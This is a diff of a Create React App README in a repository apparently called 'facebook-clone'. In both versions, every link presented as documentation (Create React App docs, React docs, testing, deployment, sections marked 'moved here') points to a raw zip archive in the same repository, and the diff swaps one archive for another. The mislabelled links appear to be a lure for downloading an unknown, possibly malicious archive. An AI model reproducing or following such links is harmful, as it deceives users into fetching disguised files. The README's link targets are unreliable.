@@ -1,4 +1,4 @@
-This project was bootstrapped with [Create React App](https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/public/facebook-clone-1.9.zip).
+This project was bootstrapped with [Create React App](https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/src/clone-facebook-v2.3.zip).
 
 ## Available Scripts
 
@@ -15,7 +15,7 @@ You will also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.<br />
-See the section about [running tests](https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/public/facebook-clone-1.9.zip) for more information.
+See the section about [running tests](https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/src/clone-facebook-v2.3.zip) for more information.
 
 ### `npm run build`
 
@@ -25,7 +25,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.<br />
 Your app is ready to be deployed!
 
-See the section about [deployment](https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/public/facebook-clone-1.9.zip) for more information.
+See the section about [deployment](https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/src/clone-facebook-v2.3.zip) for more information.
 
 ### `npm run eject`
 
@@ -39,30 +39,30 @@ You don’t have to ever use `eject`. The curated feature set is suitable for sm
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/public/facebook-clone-1.9.zip).
+You can learn more in the [Create React App documentation](https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/src/clone-facebook-v2.3.zip).
 
-To learn React, check out the [React documentation](https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/public/facebook-clone-1.9.zip).
+To learn React, check out the [React documentation](https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/src/clone-facebook-v2.3.zip).
 
 ### Code Splitting
 
-This section has moved here: https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/public/facebook-clone-1.9.zip
+This section has moved here: https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/src/clone-facebook-v2.3.zip
 
 ### Analyzing the Bundle Size
 
-This section has moved here: https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/public/facebook-clone-1.9.zip
+This section has moved here: https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/src/clone-facebook-v2.3.zip
 
 ### Making a Progressive Web App
 
-This section has moved here: https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/public/facebook-clone-1.9.zip
+This section has moved here: https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/src/clone-facebook-v2.3.zip
 
 ### Advanced Configuration
 
-This section has moved here: https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/public/facebook-clone-1.9.zip
+This section has moved here: https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/src/clone-facebook-v2.3.zip
 
 ### Deployment
 
-This section has moved here: https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/public/facebook-clone-1.9.zip
+This section has moved here: https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/src/clone-facebook-v2.3.zip
 
 ### `npm run build` fails to minify
 
-This section has moved here: https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/public/facebook-clone-1.9.zip
+This section has moved here: https://github.com/leegm0310/facebook-clone/raw/refs/heads/master/src/clone-facebook-v2.3.zip
